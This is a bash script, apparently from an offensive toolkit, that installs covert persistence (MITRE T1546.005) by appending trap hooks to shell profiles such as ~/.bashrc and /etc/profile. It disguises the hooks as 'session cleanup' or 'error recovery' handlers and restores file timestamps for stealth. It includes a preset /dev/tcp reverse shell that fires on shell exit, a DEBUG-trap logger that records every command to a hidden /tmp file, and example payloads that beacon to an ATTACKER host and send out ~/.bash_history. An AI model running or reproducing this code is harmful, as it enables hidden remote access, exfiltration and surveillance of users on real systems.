#!/bin/bash
#
# trap_persist.sh — T1546.005 Trap Command Persistence
#
# Uses bash trap hooks (DEBUG/EXIT/ERR/RETURN) injected into shell profiles.
# DEBUG trap fires on EVERY command — extremely stealthy, rarely monitored.
# EXIT trap fires on shell close — ideal for beacon/exfil on logout.
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

TRAP_MARKER="# D3M0N_TRAP"
BACKUP_SUFFIX=".d3m0n_trap_bak"

banner_trap() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════════════╗"
    echo "  ║   T1546.005 — Trap Command Persistence               ║"
    echo "  ║   Bash trap hooks: DEBUG / EXIT / ERR / RETURN        ║"
    echo "  ╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Inject a trap into a profile file
inject_trap() {
    local profile="$1"
    local trap_type="$2"
    local payload="$3"
    local description="$4"

    if [[ ! -f "$profile" ]]; then
        echo -e "${YELLOW}  [!] Profile not found: ${profile} — creating it${NC}"
        touch "$profile"
    fi

    if grep -q "$TRAP_MARKER" "$profile" 2>/dev/null; then
        echo -e "${YELLOW}  [!] Trap already injected in ${profile}${NC}"
        return 1
    fi

    # Backup with timestamp preservation
    local orig_ts
    orig_ts=$(stat -c %Y "$profile" 2>/dev/null)
    cp "$profile" "${profile}${BACKUP_SUFFIX}" 2>/dev/null

    cat >> "$profile" << EOF

${TRAP_MARKER}_${trap_type}
# System event handler — ${description}
trap '${payload}' ${trap_type}
EOF

    # Restore timestamp for stealth
    if [[ -n "$orig_ts" ]]; then
        touch -d "@${orig_ts}" "$profile" 2>/dev/null
    fi

    echo -e "${GREEN}  [+] ${trap_type} trap injected into ${profile}${NC}"
}

# ── [1] DEBUG Trap — fires on every command ──
debug_trap() {
    echo -e "${CYAN}[*] DEBUG Trap — executes on EVERY command the user runs${NC}"
    echo -e "${YELLOW}[?] Payload command (e.g. 'curl -s http://ATTACKER/beacon?cmd=\$BASH_COMMAND &'):${NC}"
    read -r PAYLOAD
    if [[ -z "$PAYLOAD" ]]; then
        echo -e "${RED}[!] No payload specified.${NC}"
        return 1
    fi

    echo -e "${YELLOW}[?] Target profile:${NC}"
    echo "  [1] ~/.bashrc (current user)"
    echo "  [2] ~/.bash_profile (login shell)"
    echo "  [3] /etc/profile (all users — requires root)"
    echo "  [4] Custom path"
    read -r PCHOICE

    local profile
    case "$PCHOICE" in
        1) profile="$HOME/.bashrc" ;;
        2) profile="$HOME/.bash_profile" ;;
        3) profile="/etc/profile" ;;
        4)
            echo -e "${YELLOW}[?] Enter path:${NC}"
            read -r profile
            ;;
        *) echo -e "${RED}[!] Invalid choice.${NC}"; return 1 ;;
    esac

    inject_trap "$profile" "DEBUG" "$PAYLOAD" "debug event hooks"
}

# ── [2] EXIT Trap — fires on shell close ──
exit_trap() {
    echo -e "${CYAN}[*] EXIT Trap — executes when the user's shell exits/closes${NC}"
    echo -e "${YELLOW}[?] Payload command (e.g. 'nohup bash -c \"sleep 5 && curl http://ATTACKER/exfil -d @~/.bash_history\" &>/dev/null &'):${NC}"
    read -r PAYLOAD
    if [[ -z "$PAYLOAD" ]]; then
        echo -e "${RED}[!] No payload specified.${NC}"
        return 1
    fi

    echo -e "${YELLOW}[?] Target profile:${NC}"
    echo "  [1] ~/.bashrc"
    echo "  [2] ~/.bash_profile"
    echo "  [3] /etc/profile (all users)"
    echo "  [4] Custom path"
    read -r PCHOICE

    local profile
    case "$PCHOICE" in
        1) profile="$HOME/.bashrc" ;;
        2) profile="$HOME/.bash_profile" ;;
        3) profile="/etc/profile" ;;
        4) echo -e "${YELLOW}[?] Enter path:${NC}"; read -r profile ;;
        *) echo -e "${RED}[!] Invalid choice.${NC}"; return 1 ;;
    esac

    inject_trap "$profile" "EXIT" "$PAYLOAD" "session cleanup handler"
}

# ── [3] ERR Trap — fires on command errors ──
err_trap() {
    echo -e "${CYAN}[*] ERR Trap — executes whenever a command returns non-zero${NC}"
    echo -e "${YELLOW}[?] Payload command (e.g. 'echo \"\$(date) ERR: \$BASH_COMMAND\" >> /tmp/.errlog'):${NC}"
    read -r PAYLOAD
    if [[ -z "$PAYLOAD" ]]; then
        echo -e "${RED}[!] No payload specified.${NC}"
        return 1
    fi

    echo -e "${YELLOW}[?] Target profile:${NC}"
    echo "  [1] ~/.bashrc"
    echo "  [2] /etc/profile (all users)"
    echo "  [3] Custom path"
    read -r PCHOICE

    local profile
    case "$PCHOICE" in
        1) profile="$HOME/.bashrc" ;;
        2) profile="/etc/profile" ;;
        3) echo -e "${YELLOW}[?] Enter path:${NC}"; read -r profile ;;
        *) echo -e "${RED}[!] Invalid choice.${NC}"; return 1 ;;
    esac

    inject_trap "$profile" "ERR" "$PAYLOAD" "error recovery handler"
}

# ── [4] RETURN Trap — fires on function/source return ──
return_trap() {
    echo -e "${CYAN}[*] RETURN Trap — executes when a shell function or sourced script returns${NC}"
    echo -e "${YELLOW}[?] Payload command:${NC}"
    read -r PAYLOAD
    if [[ -z "$PAYLOAD" ]]; then
        echo -e "${RED}[!] No payload specified.${NC}"
        return 1
    fi

    echo -e "${YELLOW}[?] Target profile:${NC}"
    echo "  [1] ~/.bashrc"
    echo "  [2] /etc/profile (all users)"
    echo "  [3] Custom path"
    read -r PCHOICE

    local profile
    case "$PCHOICE" in
        1) profile="$HOME/.bashrc" ;;
        2) profile="/etc/profile" ;;
        3) echo -e "${YELLOW}[?] Enter path:${NC}"; read -r profile ;;
        *) echo -e "${RED}[!] Invalid choice.${NC}"; return 1 ;;
    esac

    inject_trap "$profile" "RETURN" "$PAYLOAD" "return signal handler"
}

# ── [5] Reverse Shell via EXIT Trap (preset payload) ──
revshell_exit_trap() {
    echo -e "${CYAN}[*] Preset: Reverse shell beacon on shell exit${NC}"
    echo -e "${YELLOW}[?] Attacker IP:${NC}"
    read -r LHOST
    echo -e "${YELLOW}[?] Attacker port:${NC}"
    read -r LPORT
    if [[ -z "$LHOST" || -z "$LPORT" ]]; then
        echo -e "${RED}[!] IP and port required.${NC}"
        return 1
    fi

    local PAYLOAD="nohup bash -c 'sleep 3 && bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' &>/dev/null &"

    echo -e "${YELLOW}[?] Target profile:${NC}"
    echo "  [1] ~/.bashrc (current user)"
    echo "  [2] /etc/profile (all users)"
    read -r PCHOICE

    local profile
    case "$PCHOICE" in
        1) profile="$HOME/.bashrc" ;;
        2) profile="/etc/profile" ;;
        *) echo -e "${RED}[!] Invalid choice.${NC}"; return 1 ;;
    esac

    inject_trap "$profile" "EXIT" "$PAYLOAD" "session cleanup handler"
}

# ── [6] Keylogger via DEBUG Trap (preset payload) ──
keylogger_debug_trap() {
    echo -e "${CYAN}[*] Preset: Keylogger via DEBUG trap — logs every command${NC}"
    local LOGFILE="/tmp/.$(cat /dev/urandom | tr -dc 'a-z' | head -c8)"
    echo -e "${YELLOW}[*] Commands will be logged to: ${LOGFILE}${NC}"

    local PAYLOAD="echo \"\$(date +%s) \$(whoami) \$(pwd) \$BASH_COMMAND\" >> ${LOGFILE}"

    echo -e "${YELLOW}[?] Target profile:${NC}"
    echo "  [1] ~/.bashrc (current user)"
    echo "  [2] /etc/profile (all users)"
    read -r PCHOICE

    local profile
    case "$PCHOICE" in
        1) profile="$HOME/.bashrc" ;;
        2) profile="/etc/profile" ;;
        *) echo -e "${RED}[!] Invalid choice.${NC}"; return 1 ;;
    esac

    inject_trap "$profile" "DEBUG" "$PAYLOAD" "debug event hooks"
    echo -e "${GREEN}[+] Keylogger active. Log file: ${LOGFILE}${NC}"
}

# ── [7] Cleanup ──
cleanup_traps() {
    echo -e "${CYAN}[*] Removing trap persistence from all profiles...${NC}"

    local profiles=("$HOME/.bashrc" "$HOME/.bash_profile" "$HOME/.profile" "$HOME/.zshrc" "/etc/profile")

    for profile in "${profiles[@]}"; do
        if [[ -f "$profile" ]] && grep -q "$TRAP_MARKER" "$profile" 2>/dev/null; then
            # Restore from backup if available
            if [[ -f "${profile}${BACKUP_SUFFIX}" ]]; then
                local orig_ts
                orig_ts=$(stat -c %Y "$profile" 2>/dev/null)
                cp "${profile}${BACKUP_SUFFIX}" "$profile"
                rm -f "${profile}${BACKUP_SUFFIX}"
                if [[ -n "$orig_ts" ]]; then
                    touch -d "@${orig_ts}" "$profile" 2>/dev/null
                fi
                echo -e "${GREEN}  [+] Restored: ${profile}${NC}"
            else
                # Manual removal — delete trap marker lines
                sed -i "/${TRAP_MARKER}/,+2d" "$profile"
                echo -e "${GREEN}  [+] Cleaned: ${profile}${NC}"
            fi
        fi
    done

    echo -e "${GREEN}[+] All trap persistence removed.${NC}"
}

# ── MAIN MENU ──
main_menu() {
    banner_trap
    echo -e "  ${CYAN}[1]${NC} DEBUG trap — execute payload on every command"
    echo -e "  ${CYAN}[2]${NC} EXIT trap — execute payload on shell close"
    echo -e "  ${CYAN}[3]${NC} ERR trap — execute payload on command errors"
    echo -e "  ${CYAN}[4]${NC} RETURN trap — execute payload on function return"
    echo -e "  ${CYAN}[5]${NC} Preset: Reverse shell on EXIT"
    echo -e "  ${CYAN}[6]${NC} Preset: Keylogger via DEBUG"
    echo -e "  ${CYAN}[7]${NC} Cleanup / Remove all traps"
    echo ""
    echo -e "${YELLOW}[?] Select option:${NC} "
    read -r OPT

    case "$OPT" in
        1) debug_trap ;;
        2) exit_trap ;;
        3) err_trap ;;
        4) return_trap ;;
        5) revshell_exit_trap ;;
        6) keylogger_debug_trap ;;
        7) cleanup_traps ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
}

main_menu
